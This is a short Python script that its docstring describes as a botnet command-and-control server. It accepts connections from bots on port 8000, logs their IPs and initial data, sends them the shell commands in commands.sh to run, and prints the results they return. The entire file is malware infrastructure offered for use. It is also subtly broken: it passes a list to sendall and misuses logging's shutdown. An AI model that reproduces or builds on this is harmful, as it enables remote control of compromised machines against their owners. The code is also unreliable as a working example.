'''
This is a CNC server for controlling a botnet. 
The following will be executed once a bot connects:
1) A bot on a client machine will connect to this server and send them some initial info
2) The server will read commands located within the commands.sh file
3) The server will send those commands to the client bot
4) The client bot will exicute those commands
5) The server will receive the results from the bot
'''

from logging import shutdown
import socketserver
import threading

class BotHandler(socketserver.BaseRequestHandler):
    
    def handle(self):
        # Receive any initial data
        self.data = self.request.recv(1024).strip()
        print("Bot with IP {} sent:".format(self.client_address[0]))
        print(self.data)
        # Send the bot commands
        commands = open("commands.sh", "r").readlines()
        self.request.sendall(commands)
        # Read the results of the commands sent
        self.data = self.request.recv(1024).strip()
        print("Bot with IP {} sent:".format(self.client_address[0]))
        print(self.data)
        shutdown()

if __name__ == "__main__":
    HOST, PORT = "", 8000
    tcpServer = socketserver.TCPServer((HOST, PORT), BotHandler)
    try:
        tcpServer.serve_forever()
        shutdown()
    except:
        print("There was an error")
        shutdown()